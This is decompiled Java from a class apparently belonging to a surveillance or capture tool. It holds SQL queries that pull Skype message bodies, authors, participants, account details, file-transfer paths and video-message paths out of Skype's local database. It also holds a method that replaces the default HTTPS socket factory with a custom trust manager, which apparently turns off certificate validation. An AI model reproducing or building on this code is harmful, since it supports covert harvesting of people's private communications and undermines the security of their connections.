    //   18	21	266	java/lang/Exception
    //   25	29	266	java/lang/Exception
    //   35	40	266	java/lang/Exception
    //   47	52	266	java/lang/Exception
    //   54	59	266	java/lang/Exception
    //   230	233	266	java/lang/Exception
    //   233	238	266	java/lang/Exception
    //   240	245	266	java/lang/Exception
    //   247	250	266	java/lang/Exception
    //   254	259	266	java/lang/Exception
    //   10	13	349	finally
    //   18	21	349	finally
    //   25	29	349	finally
    //   35	40	349	finally
    //   47	52	349	finally
    //   54	59	349	finally
    //   230	233	349	finally
    //   233	238	349	finally
    //   240	245	349	finally
    //   247	250	349	finally
    //   254	259	349	finally
    //   70	73	504	finally
    //   82	85	504	finally
    //   87	90	504	finally
    //   94	98	504	finally
    //   98	103	526	finally
    //   105	110	543	finally
    //   130	135	543	finally
    //   140	143	543	finally
    //   279	282	543	finally
    //   70	73	558	java/lang/Exception
    //   82	85	558	java/lang/Exception
    //   87	90	558	java/lang/Exception
    //   94	98	558	java/lang/Exception
    //   98	103	568	java/lang/Exception
    //   105	110	568	java/lang/Exception
    //   130	135	568	java/lang/Exception
    //   10	13	573	java/io/FileNotFoundException
    //   18	21	573	java/io/FileNotFoundException
    //   25	29	573	java/io/FileNotFoundException
    //   35	40	573	java/io/FileNotFoundException
    //   47	52	573	java/io/FileNotFoundException
    //   54	59	573	java/io/FileNotFoundException
    //   230	233	573	java/io/FileNotFoundException
    //   233	238	573	java/io/FileNotFoundException
    //   240	245	573	java/io/FileNotFoundException
    //   247	250	573	java/io/FileNotFoundException
    //   254	259	573	java/io/FileNotFoundException
    //   70	73	589	java/io/FileNotFoundException
    //   82	85	589	java/io/FileNotFoundException
    //   87	90	589	java/io/FileNotFoundException
    //   94	98	589	java/io/FileNotFoundException
  }
  
  private static String d()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT DISTINCT m.id, convo_id, chatmsg_status, ");
    localStringBuilder.append("chatmsg_type, m.type, body_xml, m.timestamp, author, from_dispname,");
    localStringBuilder.append("participant_count, participants, displayname ");
    localStringBuilder.append("FROM Messages m ");
    localStringBuilder.append("LEFT JOIN ");
    localStringBuilder.append("Conversations conv ");
    localStringBuilder.append("ON m.convo_id = conv.id ");
    localStringBuilder.append("LEFT JOIN ");
    localStringBuilder.append("(SELECT * FROM Chats GROUP BY (conv_dbid)) as MyUncaughtExceptionHandler ");
    localStringBuilder.append("ON m.convo_id = MyUncaughtExceptionHandler.conv_dbid ");
    localStringBuilder.append("AND (m.type IN (61, 63, 68, 70, 201, 202, 253, 254, 255))");
    localStringBuilder.append("ORDER BY m.timestamp DESC LIMIT ?");
    return localStringBuilder.toString();
  }
  
  private static String e()
  {
    return "SELECT skypename, displayname, fullname, avatar_image, mood_text FROM Accounts LIMIT 1";
  }
  
  private static String f()
  {
    return "SELECT filepath, status FROM Transfers WHERE filename = ? ORDER BY id DESC LIMIT 1";
  }
  
  private static String g()
  {
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    localStringBuilder.append("SELECT vod_path, local_path, title, description ");
    localStringBuilder.append("FROM VideoMessages ");
    localStringBuilder.append("WHERE sharing_id = ? ");
    localStringBuilder.append("ORDER BY id DESC ");
    localStringBuilder.append("LIMIT 1 ");
    return localStringBuilder.toString();
  }
  
  private static void h()
  {
    int i = 1;
    Object localObject1 = new TrustManager[i];
    e locale = new com/vvt/capture/e/e;
    locale.<init>();
    localObject1[0] = locale;
    Object localObject2 = "TLS";
    try
    {
      localObject2 = SSLContext.getInstance((String)localObject2);
      locale = null;
      SecureRandom localSecureRandom = new java/security/SecureRandom;
      localSecureRandom.<init>();
      ((SSLContext)localObject2).init(null, (TrustManager[])localObject1, localSecureRandom);
      localObject1 = ((SSLContext)localObject2).getSocketFactory();
      HttpsURLConnection.setDefaultSSLSocketFactory((SSLSocketFactory)localObject1);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        localException.printStackTrace();
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */